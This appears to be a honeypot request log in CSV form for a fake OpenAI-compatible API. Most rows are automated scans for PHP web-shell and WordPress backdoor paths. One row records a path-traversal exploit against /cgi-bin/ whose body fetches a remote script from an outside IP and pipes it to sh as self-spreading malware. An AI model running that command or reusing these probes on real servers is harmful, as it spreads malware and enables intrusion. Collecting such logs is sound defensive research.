request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
756e8805-6004-4926-b2a3-6e5eb6eabd42,2026-03-27T16:09:08.865872+00:00,anon_18b39959,GET,/Q73BO.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e25b53cd-0813-4133-adbe-7c5058bae922,2026-03-27T16:09:09.326526+00:00,anon_18b39959,GET,/rmpoa.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6b63c52f-3b79-4cb6-816e-1f653edc21bf,2026-03-27T16:09:09.792015+00:00,anon_18b39959,GET,/wgift1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
682da18a-08e8-4291-9492-1fb705128cee,2026-03-27T16:09:10.250193+00:00,anon_18b39959,GET,/torsa1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
528a3ddf-e4a9-4359-bf04-1f0b1afcfc32,2026-03-27T16:09:10.739123+00:00,anon_18b39959,GET,/xper1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
64872fa6-b33b-46d2-aab3-bce7987b79d0,2026-03-27T16:09:11.197888+00:00,anon_18b39959,GET,/gelio1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f2ebeb95-e9fa-4b3d-8c20-5af4fe83c49d,2026-03-27T16:09:11.670684+00:00,anon_18b39959,GET,/v2.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
dd56954a-a7c7-4c98-bd9a-64fb4e04fd56,2026-03-27T16:09:12.155786+00:00,anon_18b39959,GET,/v3.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c102a84b-9f74-4d92-9079-012d6c5bd0ad,2026-03-27T16:09:12.674966+00:00,anon_18b39959,GET,/v4.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a4ad2b14-bfc6-4ef2-8764-e74a25a16d0e,2026-03-27T16:09:13.147595+00:00,anon_18b39959,GET,/ant.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e81967d4-7df2-482e-b2e1-5c4131e6a08e,2026-03-27T16:09:13.623872+00:00,anon_18b39959,GET,/as.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
039efa73-ced9-4dd0-85ec-4bc4c40f0ea6,2026-03-27T16:09:14.085543+00:00,anon_18b39959,GET,/cc13.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
22c151ed-87b9-4146-b8b9-869db192b74b,2026-03-27T16:09:14.577257+00:00,anon_18b39959,GET,/bnm.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9233c20e-de3d-4286-bb9e-29557d209dfe,2026-03-27T16:09:15.038390+00:00,anon_18b39959,GET,/ccs.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5a8ebc1b-4d82-4aaa-878c-cee1272b4769,2026-03-27T16:09:15.504314+00:00,anon_18b39959,GET,/ccu.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
863f08b2-ca56-41b9-aeae-e260a993f0c5,2026-03-27T16:09:15.963789+00:00,anon_18b39959,GET,/albin.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e4ec1bc3-4673-41f0-9f9c-9d2719c6b111,2026-03-27T16:09:16.447791+00:00,anon_18b39959,GET,/north1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6057ffe1-44aa-4f3c-b280-3397caa415eb,2026-03-27T16:09:16.936022+00:00,anon_18b39959,GET,/dragonshell.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
76b6a951-ca96-45c5-b397-500547653f3c,2026-03-27T16:09:17.416959+00:00,anon_18b39959,GET,/ggb.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
872cd04e-cb43-4a9f-99d0-83a1bd3479ab,2026-03-27T16:09:17.884570+00:00,anon_18b39959,GET,/caiij.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7fd13308-9196-4b3b-ab3f-ed7ef093d742,2026-03-27T16:09:18.364882+00:00,anon_18b39959,GET,/gel4y.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
db9491a4-75d0-4b6c-9315-f9346198d439,2026-03-27T16:09:18.830318+00:00,anon_18b39959,GET,/uxijj.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6f39c8b7-3f76-4fb7-ac61-f396fc35e342,2026-03-27T16:09:19.300938+00:00,anon_18b39959,GET,/rkiea.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
55d11b22-b2bc-457e-a38e-42fc46d32186,2026-03-27T16:09:19.765622+00:00,anon_18b39959,GET,/resp.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
115a4179-6f12-4797-8139-256c0a6de518,2026-03-27T16:09:20.234422+00:00,anon_18b39959,GET,/lanou.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
04ed471e-2e5c-4712-a36b-9c695348319d,2026-03-27T16:09:20.690820+00:00,anon_18b39959,GET,/eursi.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
116a4a0c-b9e0-451b-9cac-64f7769f00d2,2026-03-27T16:09:21.166170+00:00,anon_18b39959,GET,/pas2.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ed6623f6-57f1-405a-baee-503f2a0cf4c6,2026-03-27T16:09:21.637123+00:00,anon_18b39959,GET,/schal.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
07c9fa59-f4fd-4a1f-8878-6bc02f324a31,2026-03-27T16:09:22.097653+00:00,anon_18b39959,GET,/xex.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
dd4232e7-26eb-46ed-af39-9ef0853e3655,2026-03-27T16:09:22.597089+00:00,anon_18b39959,GET,/wp-admin/maint/wta.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4fd6843d-c394-4d15-bbda-6df5e0b6b7c7,2026-03-27T16:09:23.063086+00:00,anon_18b39959,GET,/wp-admin/maint/dtyh.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3ed725a8-115b-44d4-a1bd-decc70460846,2026-03-27T16:09:23.544710+00:00,anon_18b39959,GET,/dtyh.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
07acf1ac-ea90-415c-a237-e61a11adb922,2026-03-27T16:09:24.008317+00:00,anon_18b39959,GET,/wta.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2e5a1726-d60a-4975-9d55-87d6b4544c12,2026-03-27T16:09:24.478858+00:00,anon_18b39959,GET,/ws77.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ea33f2dc-8d88-48e1-90ab-cd59e9836e46,2026-03-27T16:09:24.962021+00:00,anon_18b39959,GET,/ws86.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bdaa9774-15a8-4184-bbc3-3a9909bb6f22,2026-03-27T16:09:25.430411+00:00,anon_18b39959,GET,/saorix1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9f144c73-111d-4ee8-af55-39d4409165bb,2026-03-27T16:09:25.897168+00:00,anon_18b39959,GET,/wp-class.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ff908627-b98d-444b-879f-043e80ab1d6e,2026-03-27T16:09:26.359333+00:00,anon_18b39959,GET,/uuu.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7793dbc5-ed8f-46ff-9831-6e13dc1c6196,2026-03-27T16:09:26.832336+00:00,anon_18b39959,GET,/wp-load.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5dcc4945-0416-48ff-986d-7dcacf515c59,2026-03-27T16:09:27.303291+00:00,anon_18b39959,GET,/gpt-sh.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1b3c6f3f-cbca-430a-aa24-c039418fb8ac,2026-03-27T16:09:27.761314+00:00,anon_18b39959,GET,/bywaf.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
366ebb48-06eb-4d90-8fa1-57d76f1a2390,2026-03-27T16:09:28.227261+00:00,anon_18b39959,GET,/wp-true.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
89b36785-96cb-4149-9d4f-329052e99596,2026-03-27T16:09:28.705452+00:00,anon_18b39959,GET,/byp8.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c08a73e2-5988-4083-8ba1-dc47372ecfad,2026-03-27T16:09:29.170462+00:00,anon_18b39959,GET,/tx88.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
01a8c120-8c48-4860-bac5-36b137865061,2026-03-27T16:09:29.636118+00:00,anon_18b39959,GET,/tx79.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
480b257d-6901-4c44-b87d-78fd060e3498,2026-03-27T16:09:30.099031+00:00,anon_18b39959,GET,/max.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
53df14d3-e1ce-48ee-9232-ebcf9d06830d,2026-03-27T16:09:30.574596+00:00,anon_18b39959,GET,/z60.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3131fc0b-e1b5-4a0c-9c5f-b8a216a064c2,2026-03-27T16:09:31.034573+00:00,anon_18b39959,GET,/utky.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
027a224a-e1bd-4ee1-8a63-95bb55b199df,2026-03-27T16:09:31.504069+00:00,anon_18b39959,GET,/uang.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d4e7e3c4-efb8-43a0-a0c4-15d829b2557f,2026-03-27T16:09:31.969228+00:00,anon_18b39959,GET,/wp3.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1caa56b7-9310-410b-9429-d384a960fc47,2026-03-27T16:09:32.452716+00:00,anon_18b39959,GET,/wp9.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c8e52202-6065-4d55-b0f8-339e43a5f2ab,2026-03-27T16:09:32.924042+00:00,anon_18b39959,GET,/wp-admin/maint/absorption.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
dd809884-b7ef-4578-a659-1b9fb07e1df2,2026-03-27T16:09:33.389881+00:00,anon_18b39959,GET,/ticket.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
11bb2ace-eb50-4763-aa3f-38bd0d40323f,2026-03-27T16:09:33.856898+00:00,anon_18b39959,GET,/wglum1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
18fe49c6-919f-4a7f-88bf-6db8007e6307,2026-03-27T16:09:34.317781+00:00,anon_18b39959,GET,/xpwer1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b42d297d-0af7-45c1-b028-9603103db0a2,2026-03-27T16:09:34.776657+00:00,anon_18b39959,GET,/yuzuru1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b2909a34-058d-4e63-a9d1-489c6d6d3738,2026-03-27T16:09:35.243263+00:00,anon_18b39959,GET,/wdone1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e13e8d18-ad3f-4b84-b9e1-4c7e94cf9553,2026-03-27T16:09:35.703815+00:00,anon_18b39959,GET,/xpass.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
35b60e62-f2d3-460b-971b-1f5cbe458eec,2026-03-27T16:09:36.164107+00:00,anon_18b39959,GET,/ad.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a69be6eb-a4ce-405b-b7c9-ed5d606cdf0f,2026-03-27T16:09:36.621488+00:00,anon_18b39959,GET,/h02ugyh.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e0d94f63-cf70-4ca0-b87a-ef8f206f4fa5,2026-03-27T16:23:21.104892+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",1,
878a769b-d18f-4c55-81c5-69c274a41bdd,2026-03-27T16:45:53.918195+00:00,anon_ba15455c,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4ce22e84-44fb-41f4-9f89-99213c529ef9,2026-03-27T17:25:08.832654+00:00,anon_1beaa3df,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
8b8daaad-9122-4740-8d59-56822cd2404e,2026-03-27T17:40:40.329718+00:00,anon_b4e85ecc,GET,/wp-content/plugins/hellopress/wp_filemanager.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
efda71df-e6a6-460a-b6e3-471328837c2b,2026-03-27T17:40:40.687936+00:00,anon_b4e85ecc,GET,/sc.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
dd836a18-8ef0-483f-8234-42608e3e9563,2026-03-27T17:40:41.010843+00:00,anon_b4e85ecc,GET,/xmlrpc.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
29492b87-32f4-4c81-bfcc-68aa2cb6719b,2026-03-27T17:40:41.348775+00:00,anon_b4e85ecc,GET,/ol.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2837d2bb-0004-48fa-b192-10f260b3d8ef,2026-03-27T17:40:41.694330+00:00,anon_b4e85ecc,GET,/f6.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8106384e-321a-4947-95f6-942743144fcf,2026-03-27T17:40:42.039428+00:00,anon_b4e85ecc,GET,/inputs.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7ad7adba-7176-4252-a9c2-52a90933ad63,2026-03-27T17:40:42.380924+00:00,anon_b4e85ecc,GET,/style.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bd5d3fa4-768b-43f0-af1c-848319d0fb92,2026-03-27T17:40:42.705165+00:00,anon_b4e85ecc,GET,/bgymj.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
489419c5-9661-47ef-9ff7-c673d04877ad,2026-03-27T17:40:43.125847+00:00,anon_b4e85ecc,GET,/aa.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
00f3f61c-ac06-428c-a819-448657586d96,2026-03-27T17:40:43.456228+00:00,anon_b4e85ecc,GET,/1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
88528fe9-1d5b-4ccf-92e6-58439590186e,2026-03-27T17:40:43.780097+00:00,anon_b4e85ecc,GET,/sc.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a04ca34f-e638-4812-ac69-8c7dc60aeefd,2026-03-27T17:40:44.101629+00:00,anon_b4e85ecc,GET,/av.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3f896ef1-0cd2-4cb0-a4c9-0ec983283ef2,2026-03-27T17:40:44.434228+00:00,anon_b4e85ecc,GET,/file.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5e280f32-b6c2-4186-8339-ab2b10e9e141,2026-03-27T17:40:44.768835+00:00,anon_b4e85ecc,GET,/666.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
8bd31ce4-827d-46e6-82db-7885693765f7,2026-03-27T17:40:45.113460+00:00,anon_b4e85ecc,GET,/file59.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a563e5e2-d4c6-4655-8b31-4592c7d9e3f3,2026-03-27T17:40:45.439398+00:00,anon_b4e85ecc,GET,/bless.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
5e59c7dd-48a2-40c9-8053-474ca102a462,2026-03-27T17:40:45.774183+00:00,anon_b4e85ecc,GET,/wp9.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e74d45fe-675b-45e5-8580-2d8bf19e544c,2026-03-27T17:40:46.113309+00:00,anon_b4e85ecc,GET,/wp-act.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6e22d1e7-a09f-41cf-86cc-99e02303e9f2,2026-03-27T17:40:46.436441+00:00,anon_b4e85ecc,GET,/class-t.api.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1ef54718-42b4-4c6c-8633-4a5fecf66120,2026-03-27T17:40:46.760087+00:00,anon_b4e85ecc,GET,/xqq.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
92480217-ea3b-4b5e-9a58-096b7df134df,2026-03-27T17:40:47.107190+00:00,anon_b4e85ecc,GET,/wp-admin/css/bolt.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6e3aa4cc-0ce0-4562-8ca8-c28c9f3b3e89,2026-03-27T17:40:47.474619+00:00,anon_b4e85ecc,GET,/a.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7cfbdf77-a5ec-4e10-9ed4-1376e2f62ee6,2026-03-27T17:40:47.803488+00:00,anon_b4e85ecc,GET,/06.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
07ae89ba-515a-4956-a9d4-b5e265a35e12,2026-03-27T17:40:48.134721+00:00,anon_b4e85ecc,GET,/plss3.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
51235def-cfd1-4326-8794-f36e90cb4bfc,2026-03-27T17:40:48.460987+00:00,anon_b4e85ecc,GET,/aaa.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e5d69836-3caf-4d16-926b-41230da85f75,2026-03-27T17:40:48.790370+00:00,anon_b4e85ecc,GET,/classwithtostring.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
